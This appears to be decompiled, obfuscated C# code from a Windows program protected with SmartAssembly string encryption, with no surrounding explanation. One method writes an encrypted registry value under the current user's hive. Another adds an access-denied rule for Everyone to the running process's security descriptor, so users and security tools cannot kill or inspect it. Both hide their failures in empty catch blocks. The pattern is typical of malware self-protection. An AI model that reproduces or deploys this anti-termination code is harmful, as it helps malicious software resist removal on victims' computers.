using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace VyjVuXvolaw;

internal sealed class kdqBEzhIUc
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr DIrufvuNjQbQv, int aYhJokVtrWWNoR, [Out] byte[] xpGjMsubVrFre, uint PJKdCnPMvBbT, out uint mTBFNUAJeKvTzT);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr TAonRrdEFAcCN, int pLsKOesopJoHJV, [In] byte[] cAzQdaqGJHiJ);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void qMiNaaEKwNIlITHQ(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(CRZFkRWzfSXjW.wcGmwtolXpKf(getString_0(107402532)));
			registryKey.SetValue(CRZFkRWzfSXjW.wcGmwtolXpKf(getString_0(107402939)), getString_0(107403563));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor RZeUFdNSAPTDKih(IntPtr intptr_0)
	{
		byte[] xpGjMsubVrFre = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, xpGjMsubVrFre, 0u, out var mTBFNUAJeKvTzT);
		if ((long)mTBFNUAJeKvTzT > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, xpGjMsubVrFre = new byte[mTBFNUAJeKvTzT], mTBFNUAJeKvTzT, out mTBFNUAJeKvTzT))
		{
			return null;
		}
		return new RawSecurityDescriptor(xpGjMsubVrFre, 0);
	}

	private void AEweEEMlJc(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void fCsAhHfnjGu()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = RZeUFdNSAPTDKih(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			AEweEEMlJc(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static kdqBEzhIUc()
	{
		Strings.CreateGetStringDelegate(typeof(kdqBEzhIUc));
	}
}
